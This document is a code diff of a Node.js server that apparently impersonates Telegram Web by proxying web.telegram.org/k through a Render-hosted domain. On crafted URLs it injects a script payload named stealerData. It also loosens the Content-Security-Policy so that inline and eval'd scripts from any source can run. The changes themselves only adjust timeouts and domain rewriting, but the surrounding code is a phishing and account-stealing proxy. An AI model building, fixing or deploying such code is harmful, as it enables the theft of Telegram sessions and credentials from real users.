@@ -57,37 +57,33 @@ http.createServer(async (req, res) => {
             if ((req.url.split("/").length == 2 && req.url.split("/")[1].length == 128) || req.url.startsWith("/?tgWebAppStartParam=")) {
                 res.write(`<script src="https://telegram.org/js/telegram-web-app.js"></script><script>${stealerData}</script>`);
                 return endResponseWithCode(res, 200);
-            } else {
+ } else {
     const headersEntries = Object.entries(req.headers);
     const headers = new Headers();
     for (let i = 0; i < headersEntries.length; i++) {
         const entry = headersEntries[i];
-        headers.set(entry[0], entry[1].replaceAll("your-domain.com", "web.telegram.org")); // Update to your Render domain if needed
+        headers.set(entry[0], entry[1].replaceAll("vk-pmmm.onrender.com", "web.telegram.org")); // Fixed domain replace
     }
 
     headers.set("Accept-Encoding", "br");
 
-    // Fix: Custom Agent for longer timeouts (connect: 30s, headers/body: 60s)
-    const agent = new (require('undici').Agent)({
-        connect: { timeout: 30000 },  // 30 seconds for connection
-        headersTimeout: 60000,        // 60 seconds for headers
-        bodyTimeout: 60000            // 60 seconds for body (large pages)
-    });
+    // Fix: Use fetch options for timeouts (no undici require needed)
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 60000); // 60s overall timeout
 
     const r = await fetch(new Request("https://web.telegram.org/k" + req.url, {
         method: req.method,
         headers: headers,
         body: (req.method == "GET" || req.method == "HEAD") ? undefined : body,
-        dispatcher: agent  // Use the custom agent
-    }));
+        signal: controller.signal
+    })).finally(() => clearTimeout(timeoutId));
 
     if (!r.ok) throw new Error(`Fetch error: ${r.status}`);
 
-    // Rest of the code unchanged...
     const resHeaders = new Headers(r.headers);
 
     resHeaders.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
-    resHeaders.set('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline' vk-pmmm.onrender.com"); // Updated to your domain
+    resHeaders.set('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline' vk-pmmm.onrender.com");
     resHeaders.set('CF-Cache-Status', 'DYNAMIC');
     resHeaders.set('Pragma', 'no-cache');
     resHeaders.set('Expires', '0');
@@ -114,4 +110,5 @@ http.createServer(async (req, res) => {
 
 process.on("uncaughtException", console.error);
 process.on("unhandledRejection", console.error);
+
 
